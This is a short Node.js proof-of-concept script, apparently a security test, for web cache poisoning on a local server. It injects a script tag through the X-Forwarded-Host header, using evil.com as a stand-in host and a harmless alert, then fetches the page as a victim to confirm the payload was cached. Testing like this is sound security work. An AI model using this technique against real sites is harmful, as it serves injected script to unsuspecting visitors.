const http = require('http');

async function testPoisoning() {
    console.log('--- Step 1: Poisoning the Cache ---');
    const poisonOptions = {
        hostname: 'localhost',
        port: 3000,
        path: '/search?q=poison_test',
        headers: {
            'X-Forwarded-Host': 'evil.com/"></script><script>alert("CACHE_POISONED")</script>'
        }
    };

    await new Promise((resolve) => {
        http.get(poisonOptions, (res) => {
            console.log('Poisoning Request Status:', res.statusCode);
            console.log('X-Cache-Status (should be MISS):', res.headers['x-cache-status']);
            resolve();
        });
    });

    console.log('\n--- Step 2: Fetching as a Victim (No malicious headers) ---');
    const victimOptions = {
        hostname: 'localhost',
        port: 3000,
        path: '/search?q=poison_test'
    };

    await new Promise((resolve) => {
        http.get(victimOptions, (res) => {
            console.log('Victim Request Status:', res.statusCode);
            console.log('X-Cache-Status (should be HIT):', res.headers['x-cache-status']);
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                if (data.includes('alert("CACHE_POISONED")')) {
                    console.log('SUCCESS: Cache is poisoned! Script found in response.');
                    const snippetIndex = data.indexOf('alert("CACHE_POISONED")');
                    console.log('Snippet:', data.substring(snippetIndex - 50, snippetIndex + 50));
                } else {
                    console.log('FAILURE: Cache not poisoned.');
                }
                resolve();
            });
        });
    });
}

testPoisoning();
